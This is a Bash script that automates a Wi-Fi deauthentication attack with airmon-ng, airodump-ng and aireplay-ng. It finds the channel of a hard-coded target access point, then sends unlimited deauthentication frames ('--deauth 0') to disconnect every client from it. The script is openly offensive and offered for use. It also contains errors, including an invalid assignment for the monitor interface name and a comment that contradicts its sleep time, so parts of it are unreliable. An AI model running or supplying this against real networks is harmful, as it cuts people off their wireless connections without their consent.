#!/bin/bash

# Variables
INTERFACE="wlp4s0"  # Change this to your actual wireless interface
MONITOR_INTERFACE=INTERFACE +"mon" # Monitor mode interface name
BSSID="04:AB:08:BE:92:23"  # Replace with your target AP BSSID
SSID="ADA"  # The SSID to search for
OUTPUT_FILE="a.txt"

# Function to check and kill interfering processes
check_and_kill() {
    echo "Checking for interfering processes..."
    sudo airmon-ng check kill
}

# Function to start monitor mode
start_monitor_mode() {
    echo "Starting monitor mode on $INTERFACE..."
    sudo airmon-ng start $INTERFACE
}

# Function to deauthenticate all clients
deauth_all_clients() {
    echo "Sending deauthentication packets to all clients connected to $BSSID on channel $CHANNEL..."
    sudo aireplay-ng --deauth 0 -a $BSSID $MONITOR_INTERFACE
}

# Main script execution
check_and_kill

start_monitor_mode

# Remove the existing a.txt file if it exists
rm -f "$OUTPUT_FILE"

# Run airodump-ng in the background and redirect output to a.txt
echo "Starting airodump-ng..."
sudo airodump-ng --band abg $MONITOR_INTERFACE > "$OUTPUT_FILE" &

# Get the PID of the airodump-ng process
AIRODUMP_PID=$!

# Wait for 30 seconds
sleep 15

# Stop airodump-ng (simulating CTRL+C)
echo "Stopping airodump-ng..."
sudo kill -SIGINT $AIRODUMP_PID

# Read the a.txt file for the target BSSID and SSID
echo "Reading from $OUTPUT_FILE..."
TARGET_INFO=$(grep -m 1 "$BSSID" "$OUTPUT_FILE" | grep "$SSID")

if [[ -z "$TARGET_INFO" ]]; then
    echo "Error: Target BSSID or SSID not found in $OUTPUT_FILE."
    exit 1
fi

# Clean the line to remove escape characters
CLEAN_TARGET_INFO=$(echo "$TARGET_INFO" | sed 's/\x1b\[[0-9;]*m//g')

# Extract channel from the cleaned line (40 is fourth integer after BSSID)
CHANNEL=$(echo "$CLEAN_TARGET_INFO" | awk '{print $(NF-5)}')  # Skip 5 integers back from last field

if [[ -z "$CHANNEL" ]]; then
    echo "Error: Could not extract channel."
    exit 1
fi

echo "Extracted channel: $CHANNEL"

# Set the channel manually using iwconfig
echo "Setting channel $CHANNEL on interface $MONITOR_INTERFACE..."
sudo iwconfig $MONITOR_INTERFACE channel $CHANNEL

# Run aireplay-ng with the extracted channel and BSSID (no client MAC specified)
deauth_all_clients
